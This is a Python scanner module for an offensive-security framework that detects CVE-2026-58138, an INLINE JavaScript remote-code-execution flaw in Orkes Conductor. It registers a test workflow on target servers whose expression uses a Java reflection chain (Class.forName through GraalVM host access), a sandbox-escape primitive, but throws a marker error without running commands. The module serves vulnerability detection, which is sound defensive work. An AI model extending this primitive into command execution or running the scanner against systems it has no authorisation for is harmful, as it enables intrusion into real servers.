import json
import secrets
import ssl
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

METADATA = "/api/metadata/workflow"
START = "/api/workflow/"
MARKER = "METIS_58138_OK"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class ConductorCve202658138Scanner(Auxiliary):
    NAME = "Orkes Conductor INLINE RCE Detection (CVE-2026-58138)"
    DESCRIPTION = (
        "Registers an INLINE JavaScript workflow whose GraalVM context "
        "uses HostAccess.ALL. The expression raises a marker exception "
        "instead of executing commands. Vulnerable targets echo the "
        "marker in the task output."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-07-10"
    CHECK = True
    REFERENCES = [
        "CVE-2026-58138",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-58138",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=8080, type=int, description="Conductor HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=30.0, type=float, description="per-request timeout"),
        Option("THREADS", default=10, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _post(self, host, path, data):
        ctx = ssl._create_unverified_context()
        body = json.dumps(data).encode()
        req = urllib.request.Request(self._base(host) + path, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Accept", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
            return r.status, r.read().decode(errors="replace")

    def _get(self, host, path):
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(self._base(host) + path)
        req.add_header("Accept", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
            return r.status, r.read().decode(errors="replace")

    def _probe(self, host):
        wf_name = "metis_" + secrets.token_hex(4)
        marker = MARKER
        expression = (
            "var k=$.getClass().getClass();"
            "var S=k.getMethod('getName').getReturnType();"
            "var forName=k.getMethod('forName',S);"
            "var L=function(n){return forName.invoke(null,[n]);};"
            "var T=L('java.lang.Throwable');"
            "throw new Error('" + marker + "');"
        )
        wfdef = {
            "name": wf_name, "version": 1, "schemaVersion": 2,
            "ownerEmail": "metis@example.com",
            "tasks": [{
                "name": "probe", "taskReferenceName": "probe",
                "type": "INLINE",
                "inputParameters": {
                    "evaluatorType": "javascript",
                    "expression": expression,
                },
            }],
        }
        try:
            st, _ = self._post(host, METADATA, wfdef)
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "metadata: " + type(e).__name__)
        if st not in (200, 201, 204):
            return HostResult(host, "safe", "metadata HTTP " + str(st))
        try:
            st, body = self._post(host, START + wf_name, {})
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "start: " + type(e).__name__)
        if st not in (200, 201):
            return HostResult(host, "safe", "start HTTP " + str(st))
        wfid = body.strip().strip('"')
        time.sleep(2)
        try:
            st, info = self._get(host, START + wfid + "?includeTasks=true")
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "poll: " + type(e).__name__)
        if st != 200:
            return HostResult(host, "safe", "poll HTTP " + str(st))
        if marker in info:
            return HostResult(host, "vulnerable", "INLINE marker observed")
        return HostResult(host, "safe", "workflow ran without marker")

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Orkes Conductor")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-58138", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host)))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits
